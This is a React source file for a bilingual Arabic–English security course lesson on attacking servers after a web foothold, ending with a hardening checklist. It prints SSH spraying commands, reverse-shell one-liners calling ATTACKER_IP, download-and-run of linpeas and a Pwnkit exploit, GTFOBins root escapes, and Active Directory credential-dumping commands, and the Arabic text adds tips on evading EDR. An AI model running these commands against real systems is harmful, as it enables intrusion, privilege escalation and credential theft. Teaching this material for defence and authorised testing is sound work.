"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="server-attacks">
      <L
        ar={<>
          <Section title="من الويب للسيرفر — وصلنا لتنفيذ الأوامر">
            <Analogy>
              طب وصلنا للويب، وبعدين؟
              نقعد نتفرّج على الـ login page؟
              ولا نوصل للـ root وناخد الموضوع جد؟
              <br/><br/>
              فتحنا الباب الأمامي للمحل (الويب). دلوقتي عايزين ندخل المخزن (السيرفر)، وبعدها مكتب المدير (root). كل خطوة فيهم محتاجة مفتاح مختلف، وكل مفتاح ليه سكة مختلفة.
              <br/><br/>
              في حادثة Equifax 2017، Apache Struts vulnerability في تطبيق ويب أدّت لـ initial RCE. اللي حصل بعد كده هو الكارثة: المهاجم قعد جوه 76 يوم، عمل lateral movement على 51 قاعدة بيانات، وسحب 147 مليون سجل. الـ vuln مش هي الكارثة — الـ post-exploitation هي الكارثة.
            </Analogy>
            <Callout kind="warn" title="غلطات الـ junior بعد أول shell">
              <ul>
                <li>يعمل Ctrl+C في reverse shell خام، فيقتل الـ session كلها. ارفع الـ shell الأول.</li>
                <li>يشغّل linpeas من غير ما يفحص الـ EDR. الـ EDR بيشوف اسم الـ binary من على بُعد كيلومتر.</li>
                <li>يلاقي SUID على /usr/bin/find ويطير لـ GTFOBins من غير ما يفهم بيعمل إيه.</li>
                <li>يخش بـ root direct بدل ما يعمل persistence أهدا. أول reboot، إنت بره.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="Initial Foothold — أول قدم جوة">
            <ul>
              <li><b>RCE</b> عن طريق ثغرة ويب (اتكلمنا عنها الدرس اللي فات).</li>
              <li><b>SSH brute force / spraying</b> — اللي عنده passwords ضعيفة بيدفع التمن.</li>
              <li>خدمة قديمة فيها CVE معروفة (Tomcat, Jenkins, GitLab).</li>
              <li>مفاتيح اتسربت على GitHub — كنز بيتساب مكشوف.</li>
            </ul>
            <Code lang="SSH spray (authorized only)">{`hydra -L users.txt -p 'Summer2026!' ssh://target.gov -t 4 -f
crackmapexec ssh target.gov -u root -k id_rsa.leaked`}</Code>
          </Section>
          <Section title="Reverse Shell — قلب الاختراق كله">
            <Analogy>
              - طب الـ firewall قافل كل الـ inbound، أنا هخش إزاي يا حضرتك؟؟
              <br/><br/>
              يا مستجد.. كنت مستنيك تسأل السؤال ده.
              الـ firewall بيقفل الـ inbound، أيوه. بس الـ outbound مفتوح في 99% من الشبكات (لأن الموظفين عايزين Google و YouTube).
              فالحل بسيط: ما تحاولش تخش — خلّي السيرفر <b>هو اللي يطلع لك</b>.
              قلبت اللعبة في سطر واحد.
            </Analogy>
            <Code lang="bash">{`# على جهاز المهاجم
nc -lnvp 4444
# على الضحية
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("A",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
busybox nc ATTACKER 4444 -e sh`}</Code>
            <Callout kind="warn" title="رقّي الـ shell — متشتغلش على الخام">
              <Code lang="upgrade">{`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm-256color`}</Code>
            </Callout>
          </Section>
          <Section title="Linux Privilege Escalation — من user لـ root">
            <h3>أتمتة الفحص — متضيعش وقتك</h3>
            <Terminal lines={[
              { p: "wget http://ATTACKER/linpeas.sh -O /tmp/p.sh && bash /tmp/p.sh" },
              { o: "[+] SUID binaries:\n /usr/bin/find  — exploitable via GTFOBins\n[!] Writable /etc/passwd" },
            ]} />
            <h3>السكك المعروفة لـ root</h3>
            <ol>
              <li><b>SUID binaries</b> — افتح GTFOBins و ابص.</li>
              <li><b>Sudo misconfig</b> — اعمل sudo -l الأول، و بعدين استغل.</li>
              <li><b>Writable /etc/passwd</b> — ضيف يوزر بـ hash معروف و خلاص.</li>
              <li><b>Cron jobs</b> بتشغل سكربت إنت ممكن تعدله.</li>
              <li><b>Kernel exploits</b> — DirtyPipe (CVE-2022-0847)، Pwnkit (CVE-2021-4034).</li>
              <li><b>Docker socket</b> — /var/run/docker.sock مركّب = root على طبق.</li>
              <li><b>Capabilities</b> — cap_setuid على binary = خلاص.</li>
            </ol>
            <Code lang="GTFOBins examples">{`find . -exec /bin/sh -p \\; -quit
sudo vim -c ':!/bin/sh'
curl -sLO https://raw.githubusercontent.com/.../pwnkit.c && gcc pwnkit.c -o pk && ./pk`}</Code>
          </Section>
          <Section title="Windows Privilege Escalation">
            <ul>
              <li><b>winPEAS</b>، <b>PowerUp.ps1</b>، <b>Seatbelt</b> — أدواتك الأساسية.</li>
              <li>Unquoted Service Path.</li>
              <li>AlwaysInstallElevated.</li>
              <li>سرقة tokens بـ Mimikatz / Rubeus.</li>
              <li>Kerberoasting — تطلع SPN tickets و تكسرهم بـ hashcat.</li>
            </ul>
            <Code lang="Active Directory">{`GetUserSPNs.py corp.local/user:pass -dc-ip DC -request
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass
secretsdump.py -just-dc corp.local/admin@DC`}</Code>
          </Section>
          <Section title="الحماية: Server Hardening — قفل البيت">
            <p>اوعى تسيب سيرفر في prod من غير ما يعدّي على القائمة دي. مش "best practice" — ده الحد الأدنى.</p>
            <ol>
              <li>SSH: مفاتيح بس، fail2ban، 2FA. مفيش passwords.</li>
              <li>اقلع أي SUID مش محتاجه.</li>
              <li>طبّق CIS Benchmarks — مش زينة، ضرورة.</li>
              <li>فعّل auditd و ابعت اللوجز للـ SIEM.</li>
              <li>EDR زي Wazuh / CrowdStrike / Defender for Endpoint.</li>
              <li>AppArmor / SELinux على enforcing — مش permissive.</li>
              <li>قسّم الشبكة (microsegmentation) عشان تقفل سكة الـ lateral movement.</li>
            </ol>
            <Callout kind="info" title="قاعدة 1-10-60">CrowdStrike قالوها: اكتشف في دقيقة، حقق في 10 دقايق، احتوي في 60 دقيقة. اللي بياخد أكتر من كده بيخسر.</Callout>
          </Section>
          <Section title="الخلاصة الناشفة">
            <p>
              السيرفر مش بيتخرق بـ exploit واحد. بيتخرق بـ misconfig + missing patch + weak SSH password + SUID نسيان.
              <br/>
              الـ junior بيقول: "وصلت root، خلصت".
              <br/>
              الـ pro بيقول: "وصلت root، دلوقتي بدأت الشغل: persistence، lateral movement، cleanup، exfil".
              <br/><br/>
              في Equifax، الفترة من initial RCE لـ data exfil كانت 76 يوم. لو الـ EDR والـ network monitoring كانوا شغالين صح، الموضوع كان اتقفل في يوم. مش الـ vuln اللي خرقتهم — الـ visibility الناقصة هي اللي خرقتهم.
            </p>
            <p>اكتبها على ظهر إيدك: <b>الـ vuln بتفتحلك الباب. الـ visibility بتقفله عليك.</b></p>
          </Section>
        </>}
        en={<>
          <Section title="From web to server — getting code execution">
            <Analogy>We opened the front door (the web). Now we want the back warehouse (the server) and finally the manager's office (root). Each step needs a different "key".</Analogy>
          </Section>
          <Section title="Initial foothold">
            <ul>
              <li><b>RCE</b> via a web vulnerability (covered in the previous lesson).</li>
              <li><b>SSH brute force / spraying</b>.</li>
              <li>Old service with a known CVE (Tomcat, Jenkins, GitLab).</li>
              <li>Keys leaked on GitHub.</li>
            </ul>
            <Code lang="SSH spray (authorized only)">{`hydra -L users.txt -p 'Summer2026!' ssh://target.gov -t 4 -f
crackmapexec ssh target.gov -u root -k id_rsa.leaked`}</Code>
          </Section>
          <Section title="Reverse shell — the heart of intrusion">
            <Analogy>The firewall blocks inbound but allows outbound traffic. Solution: make the server <b>connect out to us</b>.</Analogy>
            <Code lang="bash">{`# On attacker box
nc -lnvp 4444
# On victim
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("A",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
busybox nc ATTACKER 4444 -e sh`}</Code>
            <Callout kind="warn" title="Upgrading the shell">
              <Code lang="upgrade">{`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm-256color`}</Code>
            </Callout>
          </Section>
          <Section title="Linux privilege escalation">
            <h3>Automated enumeration</h3>
            <Terminal lines={[
              { p: "wget http://ATTACKER/linpeas.sh -O /tmp/p.sh && bash /tmp/p.sh" },
              { o: "[+] SUID binaries:\n /usr/bin/find  — exploitable via GTFOBins\n[!] Writable /etc/passwd" },
            ]} />
            <h3>Common paths to root</h3>
            <ol>
              <li><b>SUID binaries</b> — see GTFOBins.</li>
              <li><b>Sudo misconfig</b> — sudo -l, then exploit.</li>
              <li><b>Writable /etc/passwd</b> — add a user with a known password hash.</li>
              <li><b>Cron jobs</b> running a script you can modify.</li>
              <li><b>Kernel exploits</b> — DirtyPipe (CVE-2022-0847), Pwnkit (CVE-2021-4034).</li>
              <li><b>Docker socket</b> — /var/run/docker.sock mounted = root.</li>
              <li><b>Capabilities</b> — cap_setuid on a binary.</li>
            </ol>
            <Code lang="GTFOBins examples">{`find . -exec /bin/sh -p \\; -quit
sudo vim -c ':!/bin/sh'
curl -sLO https://raw.githubusercontent.com/.../pwnkit.c && gcc pwnkit.c -o pk && ./pk`}</Code>
          </Section>
          <Section title="Windows privilege escalation">
            <ul>
              <li><b>winPEAS, PowerUp.ps1, Seatbelt</b>.</li>
              <li>Unquoted Service Path.</li>
              <li>AlwaysInstallElevated.</li>
              <li>Token theft via Mimikatz / Rubeus.</li>
              <li>Kerberoasting — request SPN tickets, then crack with hashcat.</li>
            </ul>
            <Code lang="Active Directory">{`GetUserSPNs.py corp.local/user:pass -dc-ip DC -request
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass
secretsdump.py -just-dc corp.local/admin@DC`}</Code>
          </Section>
          <Section title="Defense: server hardening">
            <ol>
              <li>SSH: keys only, fail2ban, 2FA.</li>
              <li>Strip every unneeded SUID.</li>
              <li>Apply CIS Benchmarks.</li>
              <li>Enable auditd + ship logs to a SIEM.</li>
              <li>EDR such as Wazuh / CrowdStrike / Defender for Endpoint.</li>
              <li>AppArmor / SELinux in enforcing mode.</li>
              <li>Network microsegmentation to block lateral movement.</li>
            </ol>
            <Callout kind="info" title="The 1-10-60 rule">CrowdStrike: detect in 1 minute, investigate in 10, contain in 60.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
